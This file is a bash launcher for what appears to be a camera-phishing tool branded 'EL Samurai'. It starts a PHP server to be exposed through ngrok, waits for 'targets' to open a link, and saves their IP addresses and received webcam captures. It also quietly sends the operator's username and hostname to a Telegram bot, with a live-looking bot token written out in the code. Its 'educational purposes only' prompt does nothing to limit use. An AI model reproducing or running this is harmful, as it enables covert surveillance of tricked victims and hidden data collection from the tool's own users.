#!/bin/bash
#!/bin/bash

# النسخة الحالية
CURRENT_VERSION="3.0"

# رابط ملفات التحكم
REPO_URL="https://raw.githubusercontent.com/EL-Samurai-Hacking/CAMERA-VIP/main"

# HWID مناسب لكل الأنظمة (تيرمكس وغيره)
HWID=$(whoami)@$(uname -n)

# 1. التحقق من إيقاف الأداة
STATUS=$(curl -s "$REPO_URL/status.txt")
if [[ "$STATUS" == "off" ]]; then
    echo "The tool has been temporarily discontinued by the developer."
    exit
fi

# 2. فحص التحديث الإجباري
REMOTE_VERSION=$(curl -s "$REPO_URL/version.txt")
if [[ "$CURRENT_VERSION" != "$REMOTE_VERSION" ]]; then
    echo "There is a new update for the tool. Please download from:"
    echo "https://github.com/EL-Samurai-Hacking/CAMERA-VIP"
    exit
fi

# 3. التحقق من الحظر
BAN_LIST=$(curl -s "$REPO_URL/banlist.txt")
if echo "$BAN_LIST" | grep -q "$HWID"; then
    echo "You have been blocked from using the tool.."
    exit
fi

# 4. فحص كلمة المرور
PASSWORD_ONLINE=$(curl -s "$REPO_URL/password.txt")
if [[ "$PASSWORD_ONLINE" != "" ]]; then
    echo -n "Enter your password: "
    read -s INPUT_PASSWORD
    echo
    if [[ "$INPUT_PASSWORD" != "$PASSWORD_ONLINE" ]]; then
        echo "Incorrect password❌️."
        exit
    fi
fi

# 5. إرسال HWID للأدمن
BOT_TOKEN="7570100498:AAE4zHMwrLtqQpim3fGw5mzakET1XvmqNbY"
CHAT_ID="7423189963"
MESSAGE="شخص شغّل الأداة
HWID: $HWID"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage"      -d chat_id="$CHAT_ID"      -d text="$MESSAGE" > /dev/null

# 6. بدء تشغيل الأداة
echo "تم التحقق بنجاح! يتم الآن تشغيل الأداة..."
# هنا تضع كود الأداة الأساسي أو تستدعي سكربت آخر

clear
printf "\n"
printf "\n"
printf "\n"
echo '
                              

                   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                 ¶¶¶¶¶¶             ¶¶¶¶¶¶¶
              ¶¶¶¶                       ¶¶¶¶
             ¶¶¶                             ¶¶
            ¶¶                                ¶¶
           ¶¶                                 ¶¶
          ¶¶                                   ¶¶
          ¶¶ ¶¶                             ¶¶ ¶¶
          ¶¶ ¶¶                             ¶¶  ¶
          ¶¶ ¶¶                             ¶¶  ¶
          ¶¶  ¶¶                            ¶¶ ¶¶
          ¶¶  ¶¶                           ¶¶  ¶¶
           ¶¶ ¶¶   ¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶   ¶¶ ¶¶
            ¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶
             ¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶
    ¶¶¶       ¶¶  ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶  ¶¶      ¶¶¶¶
   ¶¶¶¶¶     ¶¶   ¶¶¶¶¶¶¶   ¶¶¶   ¶¶¶¶¶¶¶   ¶¶     ¶¶¶¶¶¶
  ¶¶   ¶¶    ¶¶     ¶¶¶    ¶¶¶¶¶    ¶¶¶     ¶¶    ¶¶   ¶¶
 ¶¶¶    ¶¶¶¶  ¶¶          ¶¶¶¶¶¶¶          ¶¶  ¶¶¶¶    ¶¶¶
¶¶         ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶        ¶¶
¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶
  ¶¶¶¶ ¶¶¶¶¶      ¶¶¶¶¶              ¶¶¶ ¶¶     ¶¶¶¶¶¶ ¶¶¶
          ¶¶¶¶¶¶  ¶¶¶  ¶¶           ¶¶  ¶¶¶  ¶¶¶¶¶¶
              ¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶
                  ¶¶ ¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶¶
                ¶¶¶¶  ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶   ¶¶¶¶¶
            ¶¶¶¶¶ ¶¶  ꧁ EL Samurai ꧂  ¶¶ ¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶     ¶¶                 ¶¶      ¶¶¶¶¶¶¶¶¶
   ¶¶           ¶¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶          ¶¶
    ¶¶¶     ¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶     ¶¶¶
      ¶¶   ¶¶¶           ¶¶¶¶¶¶¶¶¶           ¶¶¶   ¶¶
      ¶¶  ¶¶                                   ¶¶  ¶¶
       ¶¶¶¶                                     ¶¶¶¶

      ꧁ EL Samurai ꧂
------------------------------------------------------------
⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
-----------------------------------------------------------   
' | lolcat
sleep 5
clear
echo "                YOU HAVE TO SETUP NGROK MANUALLY 
               OTHERWISE YOU WILL NOT WAN LINK...!"
sleep 3
clear
read -p $'EDUCATIONAl PURPOSES ONLY ? \e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m (Y/N) : \e[0m' option
echo ""
clear

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi
if [[ $option == *'No'* ]]; then
clear
exit
fi
if [[ $option == *'nO'* ]]; then
clear
exit
fi
if [[ $option == *'no'* ]]; then
clear
exit
fi
if [[ $option == *'NO'* ]]; then
clear
exit
fi

trap 'printf "\n";stop' 2

banner() {

echo '


                   ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                 ¶¶¶¶¶¶             ¶¶¶¶¶¶¶
              ¶¶¶¶                       ¶¶¶¶
             ¶¶¶                             ¶¶
            ¶¶                                ¶¶
           ¶¶                                 ¶¶
          ¶¶                                   ¶¶
          ¶¶ ¶¶                             ¶¶ ¶¶
          ¶¶ ¶¶                             ¶¶  ¶
          ¶¶ ¶¶                             ¶¶  ¶
          ¶¶  ¶¶                            ¶¶ ¶¶
          ¶¶  ¶¶                           ¶¶  ¶¶
           ¶¶ ¶¶   ¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶   ¶¶ ¶¶
            ¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶
             ¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶
    ¶¶¶       ¶¶  ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶  ¶¶      ¶¶¶¶
   ¶¶¶¶¶     ¶¶   ¶¶¶¶¶¶¶   ¶¶¶   ¶¶¶¶¶¶¶   ¶¶     ¶¶¶¶¶¶
  ¶¶   ¶¶    ¶¶     ¶¶¶    ¶¶¶¶¶    ¶¶¶     ¶¶    ¶¶   ¶¶
 ¶¶¶    ¶¶¶¶  ¶¶          ¶¶¶¶¶¶¶          ¶¶  ¶¶¶¶    ¶¶¶
¶¶         ¶¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶        ¶¶
¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶
  ¶¶¶¶ ¶¶¶¶¶      ¶¶¶¶¶              ¶¶¶ ¶¶     ¶¶¶¶¶¶ ¶¶¶
          ¶¶¶¶¶¶  ¶¶¶  ¶¶           ¶¶  ¶¶¶  ¶¶¶¶¶¶
              ¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶
                  ¶¶ ¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶¶
                ¶¶¶¶  ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶   ¶¶¶¶¶
            ¶¶¶¶¶ ¶¶  ꧁ EL Samurai ꧂  ¶¶ ¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶     ¶¶                 ¶¶      ¶¶¶¶¶¶¶¶¶
   ¶¶           ¶¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶          ¶¶
    ¶¶¶     ¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶     ¶¶¶
      ¶¶   ¶¶¶           ¶¶¶¶¶¶¶¶¶           ¶¶¶   ¶¶
      ¶¶  ¶¶                                   ¶¶  ¶¶
       ¶¶¶¶                                     ¶¶¶¶

      ꧁ EL Samurai ꧂
  ".________________ ꧁ EL Samurai ꧂ _________________." ' |lolcat
                                                                              
echo " "
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Tool link  :\e[0m\e[1;77m %s\e[0m\n https://github.com/EL-Samurai-Hacking/CAMERA-VIP"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Telegram  :\e[0m\e[1;77m %s\e[0m\n https://t.me/VTlL99"
printf "\n"

}

stop() {
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.5

if [[ -e "Log.log" ]]; then
echo ""
echo '
     ---------------------------   
   !      CAM FILE RECEIVED      ! 
     ---------------------------   ' | lolcat
rm -rf Log.log
fi
sleep 0.5

done 

}


local_server() {


echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
echo ""
php -S localhost:3333 > /dev/null 2>&1 & 
sleep 2
echo "Loalhost: 127.0.0.1:3333"
echo ""
echo "You have to start ngrok manually on port 3333"
checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Localhost\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option [DEFAULT IS 1]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"

if [[ $option_server -eq 1 ]]; then
local_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi

}

banner
dependencies
start1

